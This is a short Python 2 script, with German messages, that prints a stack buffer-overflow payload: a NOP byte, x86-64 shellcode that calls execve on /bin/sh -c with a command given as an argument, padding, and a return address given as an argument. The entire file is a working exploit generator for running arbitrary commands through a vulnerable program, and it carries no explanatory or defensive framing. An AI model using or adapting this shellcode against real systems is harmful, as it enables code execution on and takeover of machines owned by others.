#! /usr/bin/python2
# -*- coding: utf-8 -*-
import sys

if len(sys.argv) == 3:
    adresse = sys.argv[1].decode("hex")
    adresse = adresse[::-1]

    befehl = sys.argv[2]

else:
    print("Aufruf mit folgenden Parametern: Rücksprungadresse + Befehl")
    sys.exit(1)

shellcodeTeil1 ="\x48\x31\xc9\x51\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73" \
        + "\x68\x48\xc1\xe9\x08\x51\x54\x5f\x48\x31\xc9\x51\x66" \
        + "\x68\x2d\x63\x54\x5b\x48\x31\xc9\x51\xeb\x14\x5a\x52" \
        + "\x80\x72"
shellcodeTeil2 = "\x41\x53\x57\x54\x5e\x48\x31\xd2\x48\x31" \
        + "\xc0\xb0\x3b\x0f\x05\xe8\xe7\xff\xff\xff"

rdxWert = chr(len(befehl))
befehlLaenge = len(befehl)

print("\x90" + shellcodeTeil1 + rdxWert + shellcodeTeil2 + befehl + "A" * (201 - befehlLaenge) + adresse)
